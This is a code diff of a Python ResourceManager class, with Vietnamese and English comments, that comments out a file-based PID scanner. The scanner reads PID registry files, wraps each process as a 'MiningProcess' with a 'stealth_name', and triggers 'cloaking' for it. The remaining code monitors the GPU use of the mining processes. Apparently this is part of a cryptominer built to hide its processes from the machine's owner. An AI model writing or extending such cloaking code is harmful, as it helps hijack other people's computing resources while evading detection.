@@ -759,9 +759,6 @@ class ResourceManager(IResourceManager):
                         metrics = self.collect_metrics(mining_process)
                         self.logger.debug(f"📈 [MONITOR] PID {pid} metrics: GPU={metrics.get('gpu_usage', 0):.1f}%")
                         
-
-                            
-                
                 except (psutil.NoSuchProcess, psutil.AccessDenied):
                     dead_pids.append(pid)
                     self.logger.info(f"💀 [MONITOR] Process {pid} no longer accessible, removing")
@@ -780,154 +777,155 @@ class ResourceManager(IResourceManager):
             
         except Exception as e:
             self.logger.error(f"❌ [MONITOR] Monitoring cycle failed: {e}")
-    
-    def _start_pid_file_scanner(self):
-        """
-        **🥇 SOLUTION 1: PID File Scanner Thread** (thread scanner file PID)
+
+
+    # def _start_pid_file_scanner(self):
+    #     """
+    #     **🥇 SOLUTION 1: PID File Scanner Thread** (thread scanner file PID)
         
-        Enhanced File-Based Scanner để auto-trigger cloaking khi detect new PID files.
-        Monitor /tmp/ncs_pid_registry/ directory for new PID files và process chúng.
-        """
-        self.logger.info(f"🔍 [SOLUTION-1] PID File Scanner started - monitoring directory: {self._pid_file_directory}")
+    #     Enhanced File-Based Scanner để auto-trigger cloaking khi detect new PID files.
+    #     Monitor /tmp/ncs_pid_registry/ directory for new PID files và process chúng.
+    #     """
+    #     self.logger.info(f"🔍 [SOLUTION-1] PID File Scanner started - monitoring directory: {self._pid_file_directory}")
         
-        while not self._stop_flag:
-            try:
-                current_time = time.time()
+    #     while not self._stop_flag:
+    #         try:
+    #             current_time = time.time()
                 
-                # **Check if scanner cycle interval elapsed** (kiểm tra khoảng thời gian chu kỳ scanner)
-                if current_time - self._last_scanner_cycle >= self._file_scanner_interval:
-                    # Scanner cycle removed in Phase 4
-                    self._last_scanner_cycle = current_time
-                    self._scanner_stats['scan_cycles'] += 1
+    #             # **Check if scanner cycle interval elapsed** (kiểm tra khoảng thời gian chu kỳ scanner)
+    #             if current_time - self._last_scanner_cycle >= self._file_scanner_interval:
+    #                 # Scanner cycle removed in Phase 4
+    #                 self._last_scanner_cycle = current_time
+    #                 self._scanner_stats['scan_cycles'] += 1
                 
-                # **Sleep to prevent CPU spinning** (ngủ để tránh CPU quay không)
-                time.sleep(2.0)  # Check every 2 seconds
+    #             # **Sleep to prevent CPU spinning** (ngủ để tránh CPU quay không)
+    #             time.sleep(2.0)  # Check every 2 seconds
                 
-            except Exception as e:
-                self.logger.error(f"❌ [SOLUTION-1] File scanner error: {e}")
-                time.sleep(5.0)  # Wait longer on error
+    #         except Exception as e:
+    #             self.logger.error(f"❌ [SOLUTION-1] File scanner error: {e}")
+    #             time.sleep(5.0)  # Wait longer on error
         
-        self.logger.info("🔚 [SOLUTION-1] PID File Scanner stopped")
-    
-    def _execute_file_scanner_cycle(self, current_time: float):
-        """Deprecated in Phase 4 – no-op."""
-        return
-        """
-        **🥇 SOLUTION 1: Execute File Scanner Cycle** (thực thi chu kỳ scanner file)
+    #     self.logger.info("🔚 [SOLUTION-1] PID File Scanner stopped")
+
+    # def _execute_file_scanner_cycle(self, current_time: float):
+    #     """Deprecated in Phase 4 – no-op."""
+    #     return
+    #     """
+    #     **🥇 SOLUTION 1: Execute File Scanner Cycle** (thực thi chu kỳ scanner file)
         
-        Scan /tmp/ncs_pid_registry/ directory for new PID files và process chúng.
-        """
-        try:
-            # **Ensure PID directory exists** (đảm bảo thư mục PID tồn tại)
-            if not self._pid_file_directory.exists():
-                self.logger.debug(f"📁 [FILE-SCANNER] PID directory not found: {self._pid_file_directory}")
-                return
+    #     Scan /tmp/ncs_pid_registry/ directory for new PID files và process chúng.
+    #     """
+    #     try:
+    #         # **Ensure PID directory exists** (đảm bảo thư mục PID tồn tại)
+    #         if not self._pid_file_directory.exists():
+    #             self.logger.debug(f"📁 [FILE-SCANNER] PID directory not found: {self._pid_file_directory}")
+    #             return
             
-            self.logger.debug(f"🔍 [FILE-SCANNER] Scanning directory: {self._pid_file_directory}")
+    #         self.logger.debug(f"🔍 [FILE-SCANNER] Scanning directory: {self._pid_file_directory}")
             
-            # **Get all PID files** (lấy tất cả file PID)
-            pid_files = list(self._pid_file_directory.glob("pid_*.json"))
+    #         # **Get all PID files** (lấy tất cả file PID)
+    #         pid_files = list(self._pid_file_directory.glob("pid_*.json"))
             
-            if not pid_files:
-                self.logger.debug("📂 [FILE-SCANNER] No PID files found")
-                return
+    #         if not pid_files:
+    #             self.logger.debug("📂 [FILE-SCANNER] No PID files found")
+    #             return
             
-            self.logger.info(f"📋 [FILE-SCANNER] Found {len(pid_files)} PID files to process")
+    #         self.logger.info(f"📋 [FILE-SCANNER] Found {len(pid_files)} PID files to process")
             
-            processed_count = 0
-            for pid_file in pid_files:
-                try:
-                    success = self._process_pid_file(pid_file)
-                    if success:
-                        processed_count += 1
-                        self._scanner_stats['files_processed'] += 1
+    #         processed_count = 0
+    #         for pid_file in pid_files:
+    #             try:
+    #                 success = self._process_pid_file(pid_file)
+    #                 if success:
+    #                     processed_count += 1
+    #                     self._scanner_stats['files_processed'] += 1
                         
-                        # **Clean up processed file** (dọn dẹp file đã xử lý)
-                        try:
-                            pid_file.unlink()
-                            self.logger.debug(f"🗑️ [FILE-SCANNER] Cleaned up processed file: {pid_file.name}")
-                        except Exception as cleanup_err:
-                            self.logger.warning(f"⚠️ [FILE-SCANNER] Failed to cleanup {pid_file.name}: {cleanup_err}")
+    #                     # **Clean up processed file** (dọn dẹp file đã xử lý)
+    #                     try:
+    #                         pid_file.unlink()
+    #                         self.logger.debug(f"🗑️ [FILE-SCANNER] Cleaned up processed file: {pid_file.name}")
+    #                     except Exception as cleanup_err:
+    #                         self.logger.warning(f"⚠️ [FILE-SCANNER] Failed to cleanup {pid_file.name}: {cleanup_err}")
                     
-                except Exception as file_err:
-                    self.logger.error(f"❌ [FILE-SCANNER] Error processing file {pid_file.name}: {file_err}")
+    #             except Exception as file_err:
+    #                 self.logger.error(f"❌ [FILE-SCANNER] Error processing file {pid_file.name}: {file_err}")
             
-            # **Log cycle results** (ghi log kết quả chu kỳ)
-            self.logger.info(f"📊 [FILE-SCANNER] Cycle complete: {processed_count}/{len(pid_files)} files processed")
-            self.logger.debug(f"📈 [FILE-SCANNER] Stats: Files={self._scanner_stats['files_processed']}, "
-                            f"PIDs={self._scanner_stats['pids_discovered']}, "
-                            f"Cloaked={self._scanner_stats['cloaking_triggered']}")
+    #         # **Log cycle results** (ghi log kết quả chu kỳ)
+    #         self.logger.info(f"📊 [FILE-SCANNER] Cycle complete: {processed_count}/{len(pid_files)} files processed")
+    #         self.logger.debug(f"📈 [FILE-SCANNER] Stats: Files={self._scanner_stats['files_processed']}, "
+    #                         f"PIDs={self._scanner_stats['pids_discovered']}, "
+    #                         f"Cloaked={self._scanner_stats['cloaking_triggered']}")
             
-        except Exception as e:
-            self.logger.error(f"❌ [FILE-SCANNER] Scanner cycle failed: {e}")
-    
-    def _process_pid_file(self, pid_file: Path) -> bool:
-        """
-        **🥇 SOLUTION 1: Process Single PID File** (xử lý file PID đơn)
+    #     except Exception as e:
+    #         self.logger.error(f"❌ [FILE-SCANNER] Scanner cycle failed: {e}")
+
+    # def _process_pid_file(self, pid_file: Path) -> bool:
+    #     """
+    #     **🥇 SOLUTION 1: Process Single PID File** (xử lý file PID đơn)
         
-        Parse và process một PID file để trigger cloaking.
-        """
-        try:
-            self.logger.debug(f"📄 [FILE-PROCESS] Processing file: {pid_file.name}")
+    #     Parse và process một PID file để trigger cloaking.
+    #     """
+    #     try:
+    #         self.logger.debug(f"📄 [FILE-PROCESS] Processing file: {pid_file.name}")
             
-            # **Read and parse PID file** (đọc và phân tích file PID)
-            import json
-            with open(pid_file, 'r') as f:
-                file_data = json.load(f)
+    #         # **Read and parse PID file** (đọc và phân tích file PID)
+    #         import json
+    #         with open(pid_file, 'r') as f:
+    #             file_data = json.load(f)
             
-            # **Extract PID and metadata** (trích xuất PID và metadata)
-            pid = file_data.get('pid')
-            metadata = file_data.get('metadata', {})
+    #         # **Extract PID and metadata** (trích xuất PID và metadata)
+    #         pid = file_data.get('pid')
+    #         metadata = file_data.get('metadata', {})
             
-            if not pid:
-                self.logger.warning(f"⚠️ [FILE-PROCESS] No PID found in file: {pid_file.name}")
-                return False
+    #         if not pid:
+    #             self.logger.warning(f"⚠️ [FILE-PROCESS] No PID found in file: {pid_file.name}")
+    #             return False
             
-            self.logger.info(f"🎯 [FILE-PROCESS] Discovered PID {pid} from file {pid_file.name}")
-            self._scanner_stats['pids_discovered'] += 1
+    #         self.logger.info(f"🎯 [FILE-PROCESS] Discovered PID {pid} from file {pid_file.name}")
+    #         self._scanner_stats['pids_discovered'] += 1
             
-            # **Check if PID already monitored** (kiểm tra PID đã được giám sát chưa)
-            if pid in self._monitored_processes:
-                self.logger.debug(f"ℹ️ [FILE-PROCESS] PID {pid} already monitored, skipping")
-                return True  # Consider it success since it's already handled
+    #         # **Check if PID already monitored** (kiểm tra PID đã được giám sát chưa)
+    #         if pid in self._monitored_processes:
+    #             self.logger.debug(f"ℹ️ [FILE-PROCESS] PID {pid} already monitored, skipping")
+    #             return True  # Consider it success since it's already handled
             
-            # **Verify process still exists** (xác minh process vẫn tồn tại)
-            try:
-                import psutil
-                proc = psutil.Process(pid)
-                if not proc.is_running():
-                    self.logger.info(f"💀 [FILE-PROCESS] PID {pid} is no longer running, skipping")
-                    return True  # Success - no need to cloak a dead process
-            except (psutil.NoSuchProcess, psutil.AccessDenied):
-                self.logger.info(f"💀 [FILE-PROCESS] PID {pid} not accessible, skipping")
-                return True
+    #         # **Verify process still exists** (xác minh process vẫn tồn tại)
+    #         try:
+    #             import psutil
+    #             proc = psutil.Process(pid)
+    #             if not proc.is_running():
+    #                 self.logger.info(f"💀 [FILE-PROCESS] PID {pid} is no longer running, skipping")
+    #                 return True  # Success - no need to cloak a dead process
+    #         except (psutil.NoSuchProcess, psutil.AccessDenied):
+    #             self.logger.info(f"💀 [FILE-PROCESS] PID {pid} not accessible, skipping")
+    #             return True
             
-            # **Create MiningProcess object** (tạo đối tượng MiningProcess)
-            process_name = metadata.get('stealth_name', f'process_{pid}')
-            cmd = metadata.get('cmd', [])
+    #         # **Create MiningProcess object** (tạo đối tượng MiningProcess)
+    #         process_name = metadata.get('stealth_name', f'process_{pid}')
+    #         cmd = metadata.get('cmd', [])
             
-            mining_process = MiningProcess(
-                pid=pid,
-                name=process_name,
-                cmd=cmd
-            )
+    #         mining_process = MiningProcess(
+    #             pid=pid,
+    #             name=process_name,
+    #             cmd=cmd
+    #         )
             
-            # **Trigger cloaking via file scanner** (kích hoạt cloaking qua file scanner)
-            self.logger.info(f"🚀 [FILE-PROCESS] Triggering cloaking for discovered PID {pid}")
-            self.trigger_cloaking(mining_process, 'file_scanner_discovery')
+    #         # **Trigger cloaking via file scanner** (kích hoạt cloaking qua file scanner)
+    #         self.logger.info(f"🚀 [FILE-PROCESS] Triggering cloaking for discovered PID {pid}")
+    #         self.trigger_cloaking(mining_process, 'file_scanner_discovery')
             
-            # **Add to monitored processes** (thêm vào processes được giám sát)
-            self._monitored_processes[pid] = mining_process
-            self._scanner_stats['cloaking_triggered'] += 1
+    #         # **Add to monitored processes** (thêm vào processes được giám sát)
+    #         self._monitored_processes[pid] = mining_process
+    #         self._scanner_stats['cloaking_triggered'] += 1
             
-            self.logger.info(f"✅ [FILE-PROCESS] Successfully processed PID {pid} via file scanner")
-            return True
+    #         self.logger.info(f"✅ [FILE-PROCESS] Successfully processed PID {pid} via file scanner")
+    #         return True
             
-        except Exception as e:
-            self.logger.error(f"❌ [FILE-PROCESS] Failed to process file {pid_file.name}: {e}")
-            import traceback
-            self.logger.debug(f"🔍 [FILE-PROCESS] Traceback: {traceback.format_exc()}")
-            return False
+    #     except Exception as e:
+    #         self.logger.error(f"❌ [FILE-PROCESS] Failed to process file {pid_file.name}: {e}")
+    #         import traceback
+    #         self.logger.debug(f"🔍 [FILE-PROCESS] Traceback: {traceback.format_exc()}")
+    #         return False
 
     def stop(self):
         """**Stop ResourceManager** (dừng ResourceManager) - Interface implementation"""
